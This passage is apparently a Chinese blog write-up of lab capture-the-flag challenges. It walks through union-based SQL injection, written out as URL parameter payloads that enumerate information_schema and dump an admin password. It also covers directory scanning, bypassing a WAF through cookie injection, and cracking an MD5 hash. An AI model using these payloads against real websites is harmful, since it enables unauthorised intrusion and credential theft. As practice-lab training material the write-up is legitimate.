+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8764.png" class title="This is an test image">
+
+
+
+<h3 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8765.png" class title="This is an test image">
+
+<p><strong>判断是否存在SQL注入漏洞</strong></p>
+<p>1.构造 ?id&#x3D;1 and 1&#x3D;1 ，回车观察页面是否正常</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8766.png" class title="This is an test image"> 
+
+<p>页面返回正常，可知 and 这个参数注入进去被当成SQL语句执行了。</p>
+<p>2.构造 and 1&#x3D;2</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8767.png" class title="This is an test image">
+
+<p>页面不正常,初步判断这里可能存在一个注入漏洞</p>
+<p><strong>判断字段数</strong></p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;1 order by 1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8768.png" class title="This is an test image">
+
+<p>页面返回正常，进行第二步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 2 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8769.png" class title="This is an test image">
+
+<p>页面显示正常，进行第三步，构造 ?id&#x3D;1 and 1&#x3D;1 order by 3 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8770.png" class title="This is an test image">
+
+<p>页面返回 错误，判断字段数为 2（判断字符数只有两个）</p>
+<p><strong>判断回显点</strong></p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,2 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8771.png" class title="This is an test image">
+
+<p>页面出现了 2 ，说明我们可以在数字 2 处显示我们想要的内容</p>
+<p><strong>查询相关内容</strong></p>
+<p>查询当前数据库名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,database() 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8772.png" class title="This is an test image">
+
+<p>页面回显maoshe</p>
+<p>查询当前数据库版本：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,version() 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8773.png" class title="This is an test image">
+
+<p>回显版本号为5.5.53</p>
+<p>查询当前数据库 表名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8774.png" class title="This is an test image">
+
+<p>页面回显admin</p>
+<p>绝大数情况下，管理员的账号密码都在admin表里。</p>
+<p>查询字段名：构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8775.png" class title="This is an test image">
+
+<p>回显字段名为id</p>
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 1,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8776.png" class title="This is an test image">
+
+<p>构造 ?id&#x3D;1 and 1&#x3D;2 union select 1,column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’admin’ limit 2,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8777.png" class title="This is an test image">
+
+<p>回显password</p>
+<p>构造语句输出账号密码： ?id&#x3D;1 and 1&#x3D;2 union select 1,password from admin limit 0,1 回车</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8778.png" class title="This is an test image">
+
+<p>回显hellohack 得到管理员账号和密码为：hellokack</p>
+<p>得到flag</p>
+<h3 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8779.png" class title="This is an test image">
+
+<p>用御剑进行扫描，flag在二级目录里</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8780.png" class title="This is an test image">
+
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8781.png" class title="This is an test image">
+
+<p>点击链接，得到flag</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8782.png" class title="This is an test image">
+
+
+
+
+
+<h3 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h3><img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8783.png" class title="This is an test image">
+
+<p>随便点击一个新闻。在id&#x3D;171后面加一个引号’，测试一下是否有SQL注入</p>
+<p>有弹框了，提示过滤了很多关键字。下一步考虑如何绕过这些关键字</p>
+<p>因为网页做了waf过滤防护，这里考虑用cookie注入，可以进行绕过</p>
+<p>这里使用一个小工具进行注入</p>
+<p>打开这款插件直接在value处填写注入参数即可然后按上面的键开始（value中的值需要注意的是空格用+表示）</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8784.png" class title="This is an test image">
+
+<p>出现账号和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8785.png" class title="This is an test image">
+
+<p>将密码md5解密</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8786.png" class title="This is an test image">
+
+<p>用御剑进行扫描，获得后台地址：</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8787.png" class title="This is an test image">
+
+<p>输入之前获得的用户名和密码</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8788.png" class title="This is an test image">
+
+<p>成功拿到flag</p>
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8789.png" class title="This is an test image">
 ]]></content>
       <tags>
         <tag>Web-渗透测试</tag>
